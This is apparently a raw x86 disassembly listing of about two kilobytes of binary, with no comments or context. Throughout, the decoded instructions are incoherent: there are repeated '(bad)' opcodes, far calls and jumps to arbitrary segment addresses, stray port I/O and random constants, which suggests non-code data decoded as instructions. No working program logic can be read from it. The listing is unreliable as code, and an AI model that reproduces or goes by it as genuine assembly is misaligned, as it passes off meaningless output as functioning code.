  42736e:	rcl    BYTE PTR [eax-0x5810b402],cl
  427374:	jmp    0x9630:0x2d39910f
  42737b:	mov    ds:0xec0def63,al
  427380:	push   0xa60cecb
  427385:	and    bl,BYTE PTR [ebx+0x1a210b69]
  42738b:	and    esp,DWORD PTR [eax+0x64]
  42738e:	jb     0x427332
  427390:	pop    ebx
  427391:	or     edi,DWORD PTR [edi]
  427393:	test   BYTE PTR [edi-0x40],dl
  427396:	sar    dh,0x72
  427399:	inc    edi
  42739a:	call   0x2d13:0x2304188c
  4273a1:	adc    esp,0xffffffa7
  4273a4:	leave  
  4273a5:	pop    eax
  4273a6:	rcl    bh,cl
  4273a8:	push   ebp
  4273a9:	sar    ecx,1
  4273ab:	dec    edi
  4273ac:	mov    ebp,0xedb5b982
  4273b1:	imul   ecx,DWORD PTR [esi],0xffffff9f
  4273b4:	fdiv   DWORD PTR [edx+0x35]
  4273b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273b8:	out    0x5c,eax
  4273ba:	int3   
  4273bb:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4273bd:	add    esp,DWORD PTR [ecx]
  4273bf:	fwait
  4273c0:	mov    dl,0x98
  4273c2:	push   ebx
  4273c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273c4:	stos   BYTE PTR es:[edi],al
  4273c5:	dec    ecx
  4273c6:	mov    eax,0xfe0c3867
  4273cb:	adc    cl,BYTE PTR [eax+ebx*1]
  4273ce:	cs neg edx
  4273d1:	xor    cl,dl
  4273d3:	into   
  4273d4:	mov    cl,0xbd
  4273d6:	and    cl,ch
  4273d8:	push   0x1d
  4273da:	sub    BYTE PTR [esi+0x42],ah
  4273dd:	(bad)
  4273e1:	or     ecx,DWORD PTR [edi]
  4273e3:	jle    0x4273b7
  4273e5:	ins    BYTE PTR es:[edi],dx
  4273e6:	loopne 0x4273ad
  4273e8:	mov    esp,0x77919a34
  4273ed:	xor    cl,BYTE PTR ds:0x27887de1
  4273f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273f4:	sub    cl,bl
  4273f6:	scas   eax,DWORD PTR es:[edi]
  4273f7:	mov    edx,0xcd0bd8a5
  4273fc:	mov    dl,0xf
  4273fe:	adc    al,0xee
  427400:	sbb    BYTE PTR [ecx+0x30],0x85
  427404:	loop   0x427411
  427406:	cld    
  427407:	jmp    0x396f7bb5
  42740c:	shl    BYTE PTR [edi],cl
  42740e:	call   0xafad:0x99b05b71
  427415:	retf   
  427416:	push   esi
  427417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427418:	in     al,0x9d
  42741a:	adc    ch,dl
  42741c:	cmp    edx,edx
  42741e:	stos   BYTE PTR es:[edi],al
  42741f:	add    BYTE PTR [bx+si-0x66],dl
  427423:	mov    al,0xc4
  427425:	(bad)  
  427426:	cmp    al,0x76
  427428:	sub    BYTE PTR [ebx+0xf],bl
  42742b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42742c:	xor    ch,bh
  42742e:	cwde   
  42742f:	scas   al,BYTE PTR es:[edi]
  427430:	stc    
  427431:	sub    al,0x21
  427433:	mov    bl,0xb5
  427435:	xlat   BYTE PTR ds:[ebx]
  427436:	repnz enter 0xf62c,0x8a
  42743b:	int    0xae
  42743d:	jle    0x4273d5
  42743f:	mov    al,ds:0x7a12006d
  427444:	push   ebx
  427445:	and    BYTE PTR [edx],bl
  427447:	mov    eax,0x42937a1a
  42744c:	jb     0x427483
  42744e:	bound  ebx,QWORD PTR [eax+edi*2+0x597bafb]
  427455:	fld    QWORD PTR [esi-0x14]
  427458:	fldenv [ecx-0x66]
  42745b:	xchg   esp,eax
  42745c:	out    0xe2,eax
  42745e:	push   ecx
  42745f:	ret    0x808e
  427462:	mov    al,0xdc
  427464:	jle    0x42747d
  427466:	lods   eax,DWORD PTR ds:[esi]
  427467:	push   edx
  427468:	(bad)  
  427469:	dec    ebx
  42746a:	in     eax,dx
  42746b:	je     0x427498
  42746d:	mov    BYTE PTR [eax-0x79],0xb2
  427471:	pushf  
  427472:	test   al,0xb4
  427474:	ins    DWORD PTR es:[edi],dx
  427475:	mov    ebx,0x3338ff14
  42747a:	dec    esi
  42747b:	add    cl,0xf9
  42747e:	pop    ecx
  42747f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427480:	pop    ebx
  427481:	cld    
  427482:	int    0x21
  427484:	bnd ret 0xf452
  427488:	mov    dl,0xdb
  42748a:	mov    ds:0x660f84c7,eax
  42748f:	xchg   esi,eax
  427490:	(bad)  [edx]
  427492:	pop    ebx
  427493:	fs ja  0x42742f
  427496:	in     al,0x17
  427498:	push   ecx
  427499:	imul   edx,DWORD PTR [edx-0x78c9393f],0xffffffae
  4274a0:	sbb    eax,0x96de1a19
  4274a5:	loopne 0x42742c
  4274a7:	mov    ds:0x22150bc8,eax
  4274ac:	add    esp,esi
  4274ae:	sti    
  4274af:	jno    0x427521
  4274b1:	cld    
  4274b2:	sahf   
  4274b3:	push   0xffffffc4
  4274b5:	jnp    0x4274ea
  4274b7:	xchg   DWORD PTR [edx-0x11],esi
  4274ba:	and    al,0x8b
  4274bc:	imul   ecx,DWORD PTR [ebx],0x35
  4274bf:	adc    bh,bh
  4274c1:	test   dh,al
  4274c3:	sbb    esp,0xffffffa8
  4274c6:	call   0xca4d:0xf3ec62bd
  4274cd:	pop    eax
  4274ce:	add    bl,BYTE PTR [edi+0x5e]
  4274d1:	and    eax,0xb2a5a52
  4274d6:	mov    al,ds:0x8d17b6bf
  4274db:	add    BYTE PTR [edx-0x212c6e8],0x59
  4274e2:	jge    0x42748b
  4274e4:	(bad)  
  4274e5:	inc    BYTE PTR [ebp+edx*1-0x717852ed]
  4274ec:	mov    dl,0x6
  4274ee:	retf   0x2fdd
  4274f1:	push   ebp
  4274f2:	cmp    BYTE PTR [eax+0x341b0b26],bl
  4274f8:	mov    eax,ds:0x613591fd
  4274fd:	call   FWORD PTR [edx+0x72360c47]
  427503:	ret    
  427504:	outs   dx,BYTE PTR ds:[esi]
  427505:	mov    ah,0x9d
  427507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427508:	les    ebp,FWORD PTR [eax]
  42750a:	mov    ds:0x6f5393f2,eax
  42750f:	xor    DWORD PTR [ebx-0x38e278b7],0x52d3f759
  427519:	xor    ch,bh
  42751b:	test   eax,0xb1e19bce
  427520:	xor    ch,dh
  427522:	lods   al,BYTE PTR ds:[esi]
  427523:	push   edi
  427524:	aaa    
  427525:	xchg   esp,eax
  427526:	out    0x8e,eax
  427528:	mov    dl,0xb6
  42752a:	pop    esi
  42752b:	mov    ds:0x5f883428,al
  427530:	xor    al,0x4
  427532:	mov    ecx,0xfaa848ec
  427537:	xchg   ebx,eax
  427538:	mov    ecx,0xb8da3c5e
  42753d:	ins    BYTE PTR es:[edi],dx
  42753e:	(bad)  
  42753f:	fdivr  st,st(6)
  427541:	xchg   edx,eax
  427542:	call   0x6ef8:0xf18303c9
  427549:	das    
  42754a:	sbb    DWORD PTR [esi],esp
  42754c:	out    dx,eax
  42754d:	xor    al,BYTE PTR [edi]
  42754f:	push   ebp
  427550:	jae    0x427568
  427552:	aaa    
  427553:	pop    ecx
  427554:	xor    cl,dh
  427556:	xor    DWORD PTR ds:0x3c8f2791,ebp
  42755c:	sub    cl,BYTE PTR [edi]
  42755e:	call   0xe682:0x22dbce9
  427565:	jb     0x427595
  427567:	pop    ss
  427568:	fdivr  DWORD PTR [ecx+0x36]
  42756b:	mov    eax,ds:0xe5ee17f
  427570:	add    edi,ecx
  427572:	xchg   BYTE PTR [ecx-0x25eae1b3],dh
  427578:	mov    edx,0xeec8eeeb
  42757d:	mov    edi,0x4d48a48d
  427582:	xchg   esp,eax
  427583:	gs popa 
  427585:	imul   BYTE PTR [edx+0x78]
  427588:	mov    WORD PTR [edx+ebx*4-0x49970d7c],es
  42758f:	shl    DWORD PTR [edi-0x5a],cl
  427592:	mov    dl,0xa7
  427594:	xor    BYTE PTR [esi-0x77],bh
  427597:	sbb    eax,0xe57a7c4d
  42759c:	mov    bh,0x9
  42759e:	adc    BYTE PTR [esp+0x5c],ch
  4275a2:	pop    ebx
  4275a3:	fsub   QWORD PTR [edx+0x3]
  4275a6:	jle    0x42757b
  4275a8:	daa    
  4275a9:	or     ecx,ecx
  4275ab:	push   ds
  4275ac:	lea    esp,[esp+ebp*4-0x25]
  4275b0:	cmc    
  4275b1:	mov    WORD PTR [edx+0x4682ab66],ds
  4275b7:	stos   BYTE PTR es:[edi],al
  4275b8:	sbb    dl,BYTE PTR [ebx+ebx*8+0x4ee8a6a4]
  4275bf:	fcom   QWORD PTR [ebp+0x43]
  4275c2:	push   ebx
  4275c3:	lock push esi
  4275c5:	fisttp WORD PTR [ebp-0x39]
  4275c8:	inc    esi
  4275c9:	enter  0x5a74,0xbd
  4275cd:	sar    BYTE PTR [eax-0x77],cl
  4275d0:	(bad)  [ebx+0x60]
  4275d3:	or     ecx,esi
  4275d5:	mov    cl,0x4c
  4275d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275d8:	pop    ebp
  4275d9:	mov    ebp,0x3ac93b09
  4275de:	aad    0xd3
  4275e0:	scas   eax,DWORD PTR es:[edi]
  4275e1:	pushf  
  4275e2:	adc    edx,DWORD PTR [ebx-0x36]
  4275e5:	adc    eax,0x18329c3e
  4275ea:	(bad)  
  4275ec:	in     eax,dx
  4275ed:	sahf   
  4275ee:	or     esp,DWORD PTR [edi-0x7b8046f6]
  4275f4:	and    DWORD PTR [ebp-0x49],esp
  4275f7:	cmp    eax,eax
  4275f9:	push   esi
  4275fa:	xchg   ebp,eax
  4275fb:	push   ecx
  4275fc:	scas   al,BYTE PTR es:[edi]
  4275fd:	pop    es
  4275fe:	push   0x36708e87
  427603:	mov    ah,0xf3
  427605:	or     esp,DWORD PTR [edx]
  427607:	sbb    DWORD PTR [eax+0xec88d21],eax
  42760d:	xchg   edx,eax
  42760e:	mov    eax,ds:0x10a93f7
  427613:	fnstenv [edi-0x7d6183c6]
  427619:	inc    edi
  42761a:	mov    bl,0x9b
  42761c:	adc    ch,ah
  42761e:	sbb    dl,dl
  427620:	jg     0x4275fd
  427622:	xchg   ebp,eax
  427623:	or     DWORD PTR [ebx-0xc],eax
  427626:	test   DWORD PTR [edi],ebx
  427628:	sti    
  427629:	jge    0x427685
  42762b:	js     0x427611
  42762d:	cmp    DWORD PTR [edx],ebx
  42762f:	repz cmp al,0xb
  427632:	fsub   st,st(0)
  427634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427635:	jbe    0x427662
  427637:	xor    eax,0x9d9acbf4
  42763c:	aad    0x50
  42763e:	(bad)  
  42763f:	jg     0x427668
  427641:	gs sbb al,0xa7
  427644:	les    edi,FWORD PTR [ebp+0x48153012]
  42764a:	arpl   WORD PTR [ecx-0x4d],sp
  42764d:	push   es
  42764e:	lods   al,BYTE PTR ds:[esi]
  42764f:	mov    ds:0xdeb0efcd,al
  427654:	push   edx
  427655:	popa   
  427656:	mov    bh,0xd6
  427658:	ret    
  427659:	pop    ss
  42765a:	adc    bl,BYTE PTR [esi-0x5a7974c7]
  427660:	adc    al,0xab
  427662:	inc    ebp
  427663:	mov    ch,0xb2
  427665:	inc    ebp
  427666:	(bad)  
  427667:	mov    eax,0x44fe1fef
  42766c:	ret    
  42766d:	or     BYTE PTR [esi-0x7b],ah
  427670:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427671:	mov    ch,0xb1
  427673:	push   ds
  427674:	adc    ch,BYTE PTR [ebp-0xf]
  427677:	imul   esi,DWORD PTR [edx-0xb0e26f4],0x78
  42767e:	stos   BYTE PTR es:[edi],al
  42767f:	or     esi,DWORD PTR [edi+0xb]
  427682:	je     0x4276f0
  427684:	mov    esp,0xbdcbe580
  427689:	cld    
  42768a:	daa    
  42768b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42768c:	in     al,0xa1
  42768e:	and    esi,edi
  427690:	daa    
  427691:	mov    bl,0x7d
  427693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427694:	or     dl,0x8a
  427697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427698:	jl     0x4276fc
  42769a:	sbb    eax,0xf0f1b27f
  42769f:	pop    edx
  4276a0:	aad    0xa3
  4276a2:	dec    edx
  4276a3:	push   es
  4276a4:	mov    bl,0xc
  4276a6:	jge    0x42768c
  4276a8:	mov    ss,WORD PTR [edi]
  4276aa:	dec    ecx
  4276ab:	idiv   BYTE PTR [edx+0x5f574b2a]
  4276b1:	add    BYTE PTR [ebp+0x6dae1ba8],bl
  4276b7:	fdiv   QWORD PTR [edx-0x3056c5ec]
  4276bd:	or     edi,DWORD PTR [ebx]
  4276bf:	pop    ecx
  4276c0:	mov    WORD PTR [esi+0x5b00b2db],?
  4276c6:	call   0x17ac:0x207a20b0
  4276cd:	repnz les esp,FWORD PTR [edi+0x6701db0a]
  4276d4:	jns    0x42770c
  4276d6:	imul   esp,DWORD PTR [edx-0x16],0x5ea74bea
  4276dd:	loope  0x42768a
  4276df:	cmp    DWORD PTR [ebx-0x34],esi
  4276e2:	retf   
  4276e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4276e4:	mov    WORD PTR [ecx],?
  4276e6:	pop    ds
  4276e7:	in     al,0x81
  4276e9:	pop    edi
  4276ea:	or     al,0x10
  4276ec:	mov    ebp,0x4867310f
  4276f1:	or     esp,DWORD PTR [edi]
  4276f3:	sub    ecx,ebx
  4276f5:	bnd jbe 0x42767b
  4276f8:	es ins DWORD PTR es:[edi],dx
  4276fa:	fldenv [ebp+0x4eeb02a5]
  427700:	jae    0x4276f0
  427702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427703:	push   ebx
  427704:	xor    BYTE PTR ds:0xaf39419a,0x5c
  42770b:	cli    
  42770c:	pop    es
  42770d:	xchg   DWORD PTR [ebx-0x36f4e225],esp
  427713:	xchg   ebx,eax
  427714:	push   esi
  427715:	dec    edx
  427716:	in     eax,0x6b
  427718:	xchg   ebx,eax
  427719:	sbb    DWORD PTR [edx+0x31a210af],0x80231a44
  427723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427724:	sub    ah,BYTE PTR [ecx+0x3bf48d72]
  42772a:	dec    ebp
  42772b:	pushf  
  42772c:	mov    bl,0x9
  42772e:	mov    ds:0x175283f3,eax
  427733:	inc    esp
  427734:	pushw  ss
  427736:	pushf  
  427737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427738:	in     eax,dx
  427739:	outs   dx,BYTE PTR ds:[esi]
  42773a:	shl    BYTE PTR [edx+0x69972db7],1
  427740:	mov    dl,0xe9
  427742:	mov    ch,cl
  427744:	stc    
  427745:	aam    0xa2
  427747:	adc    eax,0xb4e30b58
  42774c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42774d:	retf   
  42774e:	sub    DWORD PTR [edx],edx
  427750:	ja     0x427702
  427752:	fwait
  427753:	jge    0x427737
  427755:	inc    edx
  427756:	and    al,0xb9
  427758:	jns    0x427769
  42775a:	inc    esi
  42775b:	xor    al,0xbe
  42775d:	add    al,0xf6
  42775f:	and    DWORD PTR [ebp+0x6e],esi
  427762:	push   ecx
  427763:	das    
  427764:	xor    bh,BYTE PTR [eax]
  427766:	mov    dl,0x5d
  427768:	stos   DWORD PTR es:[edi],eax
  427769:	sub    BYTE PTR [edx+0x36496a8a],bl
  42776f:	pop    ds
  427770:	test   al,0x75
  427772:	je     0x42771b
  427774:	aas    
  427775:	pop    ebx
  427776:	js     0x4277d4
  427778:	cwde   
  427779:	jns    0x4277e9
  42777b:	xor    BYTE PTR [edx-0x18a613ae],dh
  427781:	ins    BYTE PTR es:[edi],dx
  427782:	mov    DWORD PTR [eax],edx
  427784:	inc    ebp
  427785:	or     ebp,edx
  427787:	and    eax,0xdbaf1c32
  42778c:	xchg   esi,eax
  42778d:	mov    ds:0xc7c30f3a,eax
  427792:	call   0xa101:0xe5ddc102
  427799:	outs   dx,WORD PTR ds:[esi]
  42779b:	mov    al,ds:0xdf19437c
  4277a0:	call   0x98c0fa10
  4277a5:	stc    
  4277a6:	cdq    
  4277a7:	xor    BYTE PTR [ecx+0x79],dh
  4277aa:	ins    BYTE PTR es:[edi],dx
  4277ab:	js     0x4277b6
  4277ad:	mov    ds:0xdc42b722,al
  4277b2:	xchg   BYTE PTR [edi+0x4b8f3e7e],ah
  4277b8:	add    eax,0xc97a11b6
  4277bd:	mov    eax,0xb4cd6766
  4277c2:	call   0xd7be:0x32f01458
  4277c9:	sub    BYTE PTR [edx],al
  4277cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277cc:	sahf   
  4277cd:	mov    ebx,0x59de82b0
  4277d2:	or     al,0x44
  4277d4:	mov    dl,0x40
  4277d6:	push   ebp
  4277d7:	fst    DWORD PTR [eax]
  4277d9:	loop   0x427787
  4277db:	sbb    BYTE PTR [ebp+0x6c41f770],bl
  4277e1:	add    eax,0x9176c11f
  4277e6:	fcmovu st,st(4)
  4277e8:	sbb    dh,BYTE PTR [edx-0x55]
  4277eb:	push   esi
  4277ec:	scas   al,BYTE PTR es:[edi]
  4277ed:	mov    al,ds:0x977235de
  4277f2:	inc    ecx
  4277f3:	mov    esi,0xa7a79bb1
  4277f8:	cmp    esp,DWORD PTR [ebp-0x6]
  4277fb:	cli    
  4277fc:	outs   dx,DWORD PTR ds:[esi]
  4277fd:	mov    esi,0x515ce529
  427802:	call   0xdde9:0x8463a360
  427809:	sub    eax,0x470cffb3
  42780e:	call   0x21f6:0xaa24633a
  427815:	jae    0x4277b1
  427817:	repz push ecx
  427819:	es dec edx
  42781b:	push   ebx
  42781c:	aas    
  42781d:	sub    al,0xf3
  42781f:	pop    es
  427820:	xor    eax,0xbda8313c
  427825:	mul    DWORD PTR [ebp+0x4da31251]
  42782b:	fisttp WORD PTR [eax+0x52]
  42782e:	xchg   esp,eax
  42782f:	xor    al,0xee
  427831:	ret    0xc7ea
  427834:	ror    DWORD PTR [edx+0xb8ef00b],1
  42783a:	pop    edx
  42783b:	mov    cl,0x98
  42783d:	loope  0x42787e
  42783f:	mov    eax,0xc6684746
  427844:	scas   eax,DWORD PTR es:[edi]
  427845:	icebp  
  427846:	or     DWORD PTR ds:0xfbd5c572,edx
  42784c:	sti    
  42784d:	cmp    eax,0x541da6d0
  427852:	jne    0x427882
  427854:	pusha  
  427855:	in     eax,0x53
  427857:	push   edi
  427858:	jecxz  0x427888
  42785a:	js     0x4277e9
  42785c:	mov    dl,0x99
  42785e:	out    dx,al
  42785f:	pop    ebx
  427860:	push   ebx
  427861:	fisttp WORD PTR [ecx+0x24]
  427864:	jg     0x427871
  427866:	clc    
  427867:	lock pop esp
  427869:	bound  eax,QWORD PTR [esi-0x55]
  42786c:	retf   0x9d66
  42786f:	sub    al,0x29
  427871:	faddp  st(4),st
  427873:	xor    edx,eax
  427875:	jg     0x4278b7
  427877:	je     0x4278ab
  427879:	adc    al,0xcd
  42787b:	repnz test DWORD PTR [ebp+0x26],0xd7db32e5
  427883:	sbb    al,0xc2
  427885:	ficomp DWORD PTR [eax+0x5a04ca6]
  42788b:	bound  edx,QWORD PTR [ebp+0xdcf6a4b]
  427891:	or     ebp,edi
  427893:	call   0x5128238
  427898:	lods   al,BYTE PTR ds:[esi]
  427899:	xchg   esi,eax
  42789a:	xchg   BYTE PTR [ebp-0x59e58074],bl
  4278a0:	bound  edx,QWORD PTR [ecx-0x2d]
  4278a3:	jle    0x4278e4
  4278a5:	or     ebx,DWORD PTR [edx+ecx*1-0x383489c2]
  4278ac:	jmp    0x4278b3
  4278ae:	call   0xe8e8:0x57779210
  4278b5:	and    al,0xf3
  4278b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278b8:	mov    ebx,0x5dbd6429
  4278bd:	dec    esi
  4278be:	and    eax,0x8f67b293
  4278c3:	inc    ebx
  4278c4:	fist   WORD PTR ds:0x27e26faa
  4278ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278cb:	test   BYTE PTR [esi],ch
  4278cd:	add    al,0xb7
  4278cf:	mov    cl,0xb2
  4278d1:	lea    ecx,[eax]
  4278d3:	or     DWORD PTR [ebp+0x34],edx
  4278d6:	call   0x59a0:0x243a290d
  4278dd:	add    edi,edx
  4278df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278e0:	ret    
  4278e1:	inc    edx
  4278e2:	inc    ebp
  4278e3:	syscall 
  4278e5:	xor    edi,DWORD PTR [ecx]
  4278e7:	adc    dh,BYTE PTR [edx+0x61676d70]
  4278ed:	sbb    al,0xf3
  4278ef:	jno    0x42792c
  4278f1:	or     al,0x42
  4278f3:	(bad)  
  4278f4:	test   BYTE PTR [ebx+ecx*2+0x351a02e7],0x25
  4278fc:	mov    al,0xfd
  4278fe:	call   0x97b6ca07
  427903:	fs stos BYTE PTR es:[edi],al
  427905:	mov    bl,0xcc
  427907:	jmp    0x9130:0xe0c43306
  42790e:	sub    ch,BYTE PTR [eax]
  427910:	adc    edi,DWORD PTR [edi+0x7a]
  427913:	outs   dx,DWORD PTR ds:[esi]
  427914:	sbb    bh,ch
  427916:	call   0xa202:0xfa671055
  42791d:	mov    BYTE PTR ds:0xcdc289a8,0x3f
  427924:	rol    BYTE PTR [edx-0x77],cl
  427927:	add    BYTE PTR [ebp-0x6fc64b1],al
  42792d:	xor    DWORD PTR [esi+0x7],ebx
  427930:	(bad)  
  427931:	dec    ecx
  427932:	jp     0x42799b
  427934:	or     BYTE PTR [ebx],0x92
  427937:	and    DWORD PTR [eiz*4+0x6b0bb0ce],ecx
  42793e:	fwait
  42793f:	stos   DWORD PTR es:[edi],eax
  427940:	sti    
  427941:	adc    al,0x60
  427943:	lds    ecx,FWORD PTR [edi]
  427945:	xlat   BYTE PTR ds:[ebx]
  427946:	cli    
  427947:	daa    
  427948:	(bad)  
  427949:	or     eax,DWORD PTR [edi+0x57]
  42794c:	jnp    0x427976
  42794e:	lahf   
  42794f:	adc    esp,ecx
  427951:	jno    0x4278f5
  427953:	outs   dx,DWORD PTR ds:[esi]
  427954:	push   esp
  427955:	or     ebp,DWORD PTR [ebp-0x41ddcaa0]
  42795b:	shl    BYTE PTR [ebp-0x67015bf8],cl
  427961:	(bad)  
  427962:	or     al,BYTE PTR [edx+edx*2-0x4d99beab]
  427969:	lds    esp,FWORD PTR [eax]
  42796b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42796c:	xlat   BYTE PTR ds:[ebx]
  42796d:	inc    eax
  42796e:	inc    esi
  42796f:	sbb    dh,BYTE PTR [edx-0xb]
  427972:	jecxz  0x42791c
  427974:	dec    esi
  427975:	pop    ecx
  427976:	das    
  427977:	xor    dh,dl
  427979:	pop    ds
  42797a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42797c:	(bad)  
  42797d:	cmp    al,0x9e
  42797f:	inc    edi
  427980:	ror    DWORD PTR [edi],cl
  427982:	fwait
  427983:	mov    BYTE PTR [edx],dh
  427985:	js     0x4279ec
  427987:	mov    cl,0x26
  427989:	mov    bl,0x1e
  42798b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42798c:	mov    eax,0xfd2935ef
  427991:	pop    ebp
  427992:	push   eax
  427993:	pop    ebx
  427994:	lods   eax,DWORD PTR ds:[esi]
  427995:	arpl   WORD PTR [eax],ax
  427997:	sbb    dh,BYTE PTR [edx+0xb4aef1d]
  42799d:	ret    
  42799e:	cdq    
  42799f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279a0:	ret    0x4efd
  4279a3:	mov    dh,0xdc
  4279a5:	cs in  eax,dx
  4279a7:	sbb    al,0xcc
  4279a9:	or     bl,BYTE PTR [edx-0x5c63437f]
  4279af:	jno    0x427a09
  4279b1:	xchg   ecx,eax
  4279b2:	shl    DWORD PTR [edi-0x4ec176d],1
  4279b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279b9:	lock push edi
  4279bb:	sub    dh,BYTE PTR [edx+0x16776589]
  4279c1:	gs inc esp
  4279c3:	out    dx,al
  4279c4:	push   cs
  4279c5:	das    
  4279c6:	or     ecx,edx
  4279c8:	sti    
  4279c9:	xor    ecx,DWORD PTR [eax]
  4279cb:	outs   dx,DWORD PTR ds:[esi]
  4279cc:	pop    ecx
  4279cd:	mov    al,ds:0xfd3f619d
  4279d2:	dec    edx
  4279d3:	lahf   
  4279d4:	ret    
  4279d5:	push   ebp
  4279d6:	popa   
  4279d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279d8:	mov    edi,0x222bcae
  4279dd:	scas   eax,DWORD PTR es:[edi]
  4279de:	(bad)  
  4279df:	pop    edi
  4279e0:	mov    cl,0x4c
  4279e2:	and    ebp,ebp
  4279e4:	add    al,0xeb
  4279e6:	add    al,0x77
  4279e8:	fisub  DWORD PTR [eax+0x25]
  4279eb:	test   al,0x10
  4279ed:	mov    bl,0xac
  4279ef:	xchg   BYTE PTR [esi+edx*8-0x304d1044],dl
  4279f6:	inc    ebp
  4279f7:	in     eax,0x69
  4279f9:	inc    edi
  4279fa:	or     BYTE PTR ds:0x7fa630ab,ch
  427a00:	xor    ebx,DWORD PTR [edi]
  427a02:	test   DWORD PTR [ecx+0x5],esp
  427a05:	retf   0xc7ac
  427a08:	lahf   
  427a09:	sbb    DWORD PTR [esi+0x5bdaa54b],eax
  427a0f:	push   ds
  427a10:	xchg   esi,eax
  427a11:	jbe    0x4279ef
  427a13:	pop    es
  427a14:	pop    esi
  427a15:	mov    DWORD PTR [eax-0x71],eax
  427a18:	mov    ecx,0x32b964e6
  427a1d:	adc    al,0xc8
  427a1f:	addr16 adc esp,edi
  427a22:	in     eax,0xb2
  427a24:	js     0x427a56
  427a26:	call   0xfe39:0xe8f06429
  427a2d:	jecxz  0x427a84
  427a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a30:	in     eax,dx
  427a31:	jne    0x427a2b
  427a33:	in     eax,dx
  427a34:	xlat   BYTE PTR ds:[ebx]
  427a35:	mov    ebx,0x17b25258
  427a3a:	jo     0x427a78
  427a3c:	outs   dx,BYTE PTR ds:[esi]
  427a3d:	adc    BYTE PTR [ebx+0x5d93569f],0xb9
  427a44:	fiadd  DWORD PTR [ebx+0x5b6a27bd]
  427a4a:	ror    BYTE PTR [edx+0x1f9d93f2],1
  427a50:	aam    0xfe
  427a52:	rcl    DWORD PTR [eax-0x70d69e6e],1
  427a58:	mov    edi,0x36dbb80b
  427a5d:	aad    0x4d
  427a5f:	push   ds
  427a60:	stos   BYTE PTR es:[edi],al
  427a61:	cmp    eax,0x703d889a
  427a66:	jecxz  0x427abb
  427a68:	(bad)  
  427a69:	jmp    0x418b:0xa620a7b1
  427a70:	fsubr  QWORD PTR [edx+0x6f]
  427a73:	shl    BYTE PTR [edx+0x5e5a96cd],1
  427a79:	dec    ebx
  427a7a:	das    
  427a7b:	mov    ecx,0xf7730bb5
  427a80:	cmp    esp,esi
  427a82:	push   0x9a75ff3c
  427a87:	inc    ebx
  427a88:	or     edi,edx
  427a8a:	in     al,dx
  427a8b:	mov    esp,0xbaf2c0a7
  427a90:	jg     0x427a74
  427a92:	push   es
  427a93:	daa    
  427a94:	icebp  
  427a95:	xchg   edx,eax
  427a96:	arpl   WORD PTR [ebx],bx
  427a98:	lods   eax,DWORD PTR ds:[esi]
  427a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a9a:	call   0x1200:0x5b28945b
  427aa1:	dec    ebp
  427aa2:	call   0xca7b9a47
  427aa7:	nop
  427aa8:	adc    DWORD PTR [eax+0xab2766a],eax
  427aae:	ret    
  427aaf:	mov    ah,0x34
  427ab1:	pop    ss
  427ab2:	and    DWORD PTR [ebx],0x8
  427ab5:	or     eax,DWORD PTR [eax+0x76cb2a3a]
  427abb:	cmp    dl,dh
  427abd:	push   0xffffff9a
  427abf:	jne    0x427b3f
  427ac1:	cli    
  427ac2:	enter  0xc037,0xd1
  427ac6:	pop    esi
  427ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ac8:	cmp    edx,DWORD PTR [edi-0x2272f9c7]
  427ace:	test   al,0x1e
  427ad0:	mov    dl,0x94
  427ad2:	ja     0x427a91
  427ad4:	jmp    0x79f1:0x84fe5fcc
  427adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427adc:	(bad)  
  427add:	sub    DWORD PTR ds:0x2a770fee,ebx
  427ae3:	dec    esi
  427ae4:	dec    esi
  427ae5:	dec    esi
  427ae6:	sahf   
  427ae7:	push   ds
  427ae8:	cs jp  0x427a9d
  427aeb:	cmc    
  427aec:	xor    ch,BYTE PTR [eax+0x43]
  427aef:	jb     0x427ae3
  427af1:	inc    ecx
  427af2:	and    BYTE PTR [edi],0x2a
  427af5:	sub    eax,esi
  427af7:	push   eax
  427af8:	mov    eax,ds:0xb185fc7f
  427afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427afe:	xlat   BYTE PTR ds:[ebx]
  427aff:	icebp  
  427b00:	ret    0xfee3
  427b03:	or     al,0x3d
  427b05:	or     esi,esi
  427b07:	cwde   
  427b08:	fiadd  DWORD PTR [edi+0x64]
  427b0b:	push   esp
  427b0c:	scas   eax,DWORD PTR es:[edi]
  427b0d:	lods   eax,DWORD PTR ds:[esi]
  427b0e:	call   0xd286:0x2899800f
  427b15:	call   0xa4c1:0x7e4a711
  427b1c:	cli    
